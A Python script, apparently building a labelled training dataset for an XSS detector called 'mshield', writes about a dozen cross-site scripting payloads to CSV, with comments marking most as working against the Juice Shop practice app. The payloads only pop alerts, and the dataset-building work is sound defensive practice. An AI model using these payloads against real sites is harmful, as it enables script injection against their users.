import pandas as pd
import logging
import os
import csv
from typing import List, Dict

# Ensure directories exist
os.makedirs('data', exist_ok=True)
os.makedirs('mshield/logs', exist_ok=True)

# Configure logging
logging.basicConfig(
    filename='mshield/logs/payload_creator.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def generate_xss_payloads(num_payloads: int = 12) -> List[Dict[str, str]]:
    """Generate unique XSS payloads for various sanitization levels."""
    try:
        # Payloads for Juice Shop (medium sanitization) and other contexts
        payloads_list = [
            '<img src=x onerror=alert(1)>',  # Juice Shop: working
            '<input onfocus=alert(1) autofocus>',  # Juice Shop: working
            '<video src=x onerror=alert(1)>',  # Juice Shop: working
            '<audio src=x onerror=alert(1)>',  # Juice Shop: working
            '<details open ontoggle=alert(1)>',  # Juice Shop: working
            '<textarea onfocus=alert(1) autofocus>',  # Juice Shop: working
            '<button onclick=alert(1)>Click</button>',  # Juice Shop: working
            '<select onchange=alert(1)>',  # Juice Shop: likely working
            '"><img src=x onerror=alert(1)>',  # Juice Shop: working
            '<img src=invalid onerror=alert(1)>',  # Juice Shop: working
            '<script>alert(1)</script>',  # Low sanitization
            '%3Cimg%20src=x%20onerror=alert(1)%3E',  # High sanitization
            'javascript:alert(document.location)'  # DOM-based XSS
        ]
        
        # Ensure unique payloads
        selected_payloads = list(set(payloads_list))[:num_payloads]
        
        payloads = []
        for payload in selected_payloads:
            notes = f"{'event-based' if any(x in payload for x in ['onerror', 'onfocus', 'ontoggle', 'onclick', 'onchange', 'onsubmit']) else 'script-based' if '<script>' in payload else 'encoded' if '%3C' in payload else 'dom-based'}, {payload[:20]}"
            
            payloads.append({
                'payload': payload,
                'source': 'generated',
                'is_malicious': 'True',
                'notes': notes,
                'input_field': 'search_bar' if 'onerror' in payload or 'onfocus' in payload or 'ontoggle' in payload or 'onclick' in payload or 'onchange' in payload else 'profile_bio'
            })
        
        # Add non-malicious payload
        payloads.append({
            'payload': 'Hello World',
            'source': 'generated',
            'is_malicious': 'False',
            'notes': 'Non-malicious text',
            'input_field': 'search_bar'
        })
        
        logger.info(f"Generated {len(payloads)} unique payloads")
        return payloads
    except Exception as e:
        logger.error(f"Error generating payloads: {e}")
        return []

def save_payloads(payloads: List[Dict[str, str]], output_file: str = 'data/mshield_xss_data.csv'):
    """Save generated payloads to CSV."""
    try:
        df = pd.DataFrame(payloads)
        df.to_csv(output_file, index=False, quoting=csv.QUOTE_ALL, escapechar='\\')
        logger.info(f"Saved {len(payloads)} payloads to {output_file}")
    except Exception as e:
        logger.error(f"Error saving payloads to {output_file}: {e}")
        raise

def main():
    """Main function to generate and save XSS payloads."""
    try:
        payloads = generate_xss_payloads(num_payloads=12)
        save_payloads(payloads)
    except Exception as e:
        logger.error(f"Main error: {e}")
        raise

if __name__ == "__main__":
    main()